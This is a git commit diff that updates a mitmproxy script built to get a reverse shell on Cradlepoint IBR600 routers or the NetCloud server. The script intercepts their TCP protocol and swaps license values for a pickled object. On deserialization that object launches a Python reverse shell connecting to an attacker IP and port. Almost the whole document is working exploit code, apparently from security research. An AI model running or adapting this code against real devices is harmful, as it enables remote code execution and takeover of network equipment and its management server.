99021b16feab5954c9de5e132cd24b798308fa8e
stulle123 <stulle>
2023-08-22 15:42:23 +0200

    Update RCE script

--- netcloud/scripts/mitmproxy_netcloud_rce.py
+++ netcloud/scripts/mitmproxy_netcloud_rce.py
@@ -1,5 +1,6 @@
-"""Get a reverse shell on the Cradlepoint IBR600 router."""
+"""Simple mitmproxy script to get a reverse shell on the Cradlepoint IBR600 router or NetCloud server."""
 
+import ast
 import base64
 import json
 import logging
@@ -7,16 +8,14 @@ import pickle
 import struct
 import zlib
 
-from mitmproxy import tcp
 from mitmproxy.utils import strutils
 
-
 _ATTACKER_IP = "192.168.0.254"
-_ATTACKER_PORT = "5555"
-_PAYLOAD = [
+_ATTACKER_PORT = 5555
+_ROUTER_PAYLOAD = [
     "/bin/sh",
     "-c",
-    f'/usr/bin/cppython -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(({_ATTACKER_IP},{_ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
+    f'/usr/bin/cppython -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{_ATTACKER_IP}",{_ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
 ]
 
 
@@ -24,7 +23,7 @@ class Reverse:
     def __reduce__(self):
         import subprocess
 
-        return subprocess.Popen(_PAYLOAD, 0)
+        return subprocess.Popen(_ROUTER_PAYLOAD, 0)
 
 
 class StreamTranscoderV1:
@@ -47,7 +46,7 @@ class StreamTranscoderV1:
         (sof_claim, size, cmd_id) = self.header_struct.unpack(data)
         sof_actual = self._calc_sof(size, cmd_id)
         if sof_claim != sof_actual:
-            raise ValueError("Invalid start of frame byte")
+            raise ValueError("Invalid start of frame byte.")
         return (size, cmd_id)
 
     def decode(self, data):
@@ -74,21 +73,20 @@ class StreamTranscoderV1:
         return zlib.decompress(data)
 
 
-def tcp_message(flow: tcp.TCPFlow):
+def tcp_message(flow):
     message = flow.messages[-1]
     transcoder = StreamTranscoderV1()
-    message_decoded, message_encoded = b"", b""
-    command, file = "", ""
 
     try:
         msg_size, cmd_id = transcoder.header_decode(
             message.content[: transcoder.header_size]
         )
-        message_decoded = transcoder.decode(message.content[transcoder.header_size :])
+        message_str = transcoder.decode(message.content[transcoder.header_size :])
+        message_decoded = ast.literal_eval(message_str)
         logging.info(
             "tcp_message[from_client=%s, content=%s]",
             message.from_client,
-            message_decoded,
+            message_str,
         )
     except Exception as general_exception:
         logging.info(
@@ -97,20 +95,49 @@ def tcp_message(flow: tcp.TCPFlow):
             strutils.bytes_to_escaped_str(message.content),
         )
 
-    if message_decoded and not message.from_client:
-        try:
-            command = message_decoded["data"]["request"]["command"]
-            file = message_decoded["data"]["request"]["options"]["file"]
-        except KeyError:
-            pass
+    # Patch the license file from NetCloud -> Router
+    if message_decoded and not message.from_client and cmd_id == 3:
+        license = (
+            message_decoded.get("data", {})
+            .get("request", {})
+            .get("options", {})
+            .get("value")
+        )
 
-    if command == "set" and file == "keydb":
-        try:
-            payload = base64.b64encode(pickle.dumps(Reverse()))
-            message_decoded["data"]["request"]["options"]["value"] = payload.decode()
-            message_data = transcoder.encode(message_decoded)
-            message_header = transcoder.header_encode(len(message_data), cmd_id)
-            message_encoded = message_header + message_data
-            message.content = message_encoded
-        except Exception as general_exception:
-            logging.info("Could not patch pickle payload! %s", general_exception)
+        if license:
+            try:
+                reverse_shell_payload = base64.b64encode(
+                    pickle.dumps(Reverse())
+                ).decode()
+                message_decoded["data"]["request"]["options"][
+                    "value"
+                ] = reverse_shell_payload
+                message_data = transcoder.encode(str(message_decoded))
+                message_header = transcoder.header_encode(len(message_data), cmd_id)
+                message_encoded = message_header + message_data
+                message.content = message_encoded
+            except Exception as general_exception:
+                logging.info(
+                    "[NetCloud -> Router] Could not patch pickled license payload! %s",
+                    general_exception,
+                )
+
+    # Patch the license file from Router -> NetCloud
+    if message_decoded and message.from_client and cmd_id == 18:
+        license = message_decoded.get("args", {}).get("value", {}).get("data")
+
+        if license:
+            try:
+                reverse_shell_payload = base64.b64encode(
+                    pickle.dumps(Reverse())
+                ).decode()
+                message_decoded["args"]["value"]["data"] = reverse_shell_payload
+                message_data = transcoder.encode(str(message_decoded))
+                message_header = transcoder.header_encode(len(message_data), cmd_id)
+                message_encoded = message_header + message_data
+                message.content = message_encoded
+            except Exception as general_exception:
+                logging.info(
+                    "[Router -> NetCloud] Could not patch pickled license payload! %s",
+                    general_exception,
+                )
